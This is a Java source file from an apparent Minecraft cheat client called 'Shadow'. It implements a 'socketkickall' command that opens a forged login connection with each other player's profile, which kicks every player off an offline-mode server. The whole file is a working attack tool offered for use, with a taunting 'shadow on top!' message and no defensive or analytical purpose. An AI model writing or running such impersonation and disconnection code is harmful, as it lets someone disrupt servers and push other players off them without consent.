package net.shadow.feature.command;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.NetworkState;
import net.minecraft.network.listener.ClientLoginPacketListener;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
import net.minecraft.network.packet.s2c.login.*;
import net.minecraft.text.Text;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.Utils;
import org.apache.commons.io.IOUtils;

import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class KickAllCmd extends Command {
    public KickAllCmd() {
        super("socketkickall", "kick all the players off of a cracked server");
    }

    @Override
    public void call(String[] args) {
        new Thread(() -> {
            for (PlayerListEntry player : Shadow.c.getNetworkHandler().getPlayerList()) {
                if (!Shadow.c.player.getGameProfile().getId().equals(player.getProfile().getId())) {
                    if (args.length > 0) {
                        if (args[0].equals("long")) {
                            Utils.sleep(5);
                        }
                    }
                    InetSocketAddress socket = (InetSocketAddress) Shadow.c.player.networkHandler.getConnection().getAddress();
                    ClientConnection connection = ClientConnection.connect(socket, true);
                    connection.setPacketListener(new ClientLoginPacketListener() {

                        @Override
                        public void onDisconnected(Text var1) {
                        }

                        @Override
                        public ClientConnection getConnection() {
                            return null;
                        }

                        @Override
                        public void onHello(LoginHelloS2CPacket var1) {
                        }

                        @Override
                        public void onSuccess(LoginSuccessS2CPacket var1) {
                            connection.disconnect(Text.of("shadow on top!"));
                        }

                        @Override
                        public void onDisconnect(LoginDisconnectS2CPacket var1) {
                        }

                        @Override
                        public void onCompression(LoginCompressionS2CPacket var1) {
                        }

                        @Override
                        public void onQueryRequest(LoginQueryRequestS2CPacket var1) {
                        }

                    });
                    connection.send(new HandshakeC2SPacket(socket.getHostName(), socket.getPort(), NetworkState.LOGIN));
                    connection.send(new LoginHelloC2SPacket(player.getProfile()));
                    ChatUtils.message("Kicking " + player.getProfile().getName());
                }
            }
        }).start();
    }

    private String getUUID(String username) {
        try {
            URL profileURL =
                    URI.create("https://api.mojang.com/users/profiles/minecraft/")
                            .resolve(URLEncoder.encode(username, StandardCharsets.UTF_8)).toURL();

            try (InputStream profileInputStream = profileURL.openStream()) {
                JsonObject profileJson = new Gson().fromJson(
                        IOUtils.toString(profileInputStream, StandardCharsets.UTF_8),
                        JsonObject.class);

                return profileJson.get("id").getAsString();
            }
        } catch (Exception e) {
            return "91c71ac4-73a9-4659-a550-1a650731836e";
        }
    }
}
